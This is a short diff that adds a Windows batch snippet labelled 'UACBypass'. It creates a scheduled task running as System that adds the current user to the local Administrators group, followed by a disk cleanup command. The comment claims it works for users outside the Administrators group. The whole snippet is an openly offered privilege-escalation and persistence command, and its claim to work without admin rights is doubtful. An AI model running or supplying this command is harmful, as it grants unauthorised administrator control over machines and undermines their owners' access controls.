@@ -1,0 +1,4 @@
+#Work if user not have group Administrators!
+schtasks /create /tn "UACBypass" /tr "cmd.exe /c net localgroup administrators %username% /add" /sc weekly /ru "System"
+
+cleanmgr.exe /autoclean /d C:
